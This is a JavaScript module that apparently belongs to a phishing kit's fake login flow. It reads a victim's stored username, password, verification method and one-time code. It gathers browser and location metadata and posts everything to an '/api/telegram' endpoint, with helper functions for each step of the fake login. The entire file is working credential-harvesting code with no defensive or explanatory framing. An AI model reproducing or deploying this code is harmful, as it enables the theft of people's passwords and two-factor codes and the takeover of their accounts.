import {
  readStoredPassword,
  readStoredUsername,
} from '@/lib/login-flow-storage';

export function readStoredMethod() {
  if (typeof window === 'undefined') return '';
  return sessionStorage.getItem('visit_method') || '';
}

function getClientMeta() {
  if (typeof window === 'undefined') {
    return {
      userAgent: '',
      screen: '',
      language: '',
      referrer: '',
      url: '',
      localTime: '',
      utcTime: '',
    };
  }

  return {
    userAgent: window.navigator.userAgent,
    screen: `${window.screen.width}x${window.screen.height}`,
    language: window.navigator.language || '',
    referrer: document.referrer || 'Direct',
    url: window.location.href,
    localTime: new Date().toLocaleString(),
    utcTime: new Date().toUTCString(),
  };
}

export async function postTelegramEvent(eventType, overrides = {}) {
  const userId = overrides.userId ?? readStoredUsername();
  const password = overrides.password ?? readStoredPassword();
  const method = overrides.method ?? readStoredMethod();
  const code = overrides.code ?? '';

  try {
    const res = await fetch('/api/telegram', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      keepalive: eventType === 'changeMethod' || eventType === 'backToLogin',
      body: JSON.stringify({
        userId,
        password,
        method,
        code,
        client: getClientMeta(),
        eventType,
        stage: eventType,
      }),
    });

    const data = await res.json().catch(() => ({}));
    return { ok: res.ok && data.ok !== false };
  } catch {
    return { ok: false };
  }
}

export async function postTelegramNavEvent(eventType) {
  const result = await postTelegramEvent(eventType);
  await new Promise((resolve) => setTimeout(resolve, 2000));
  return result;
}
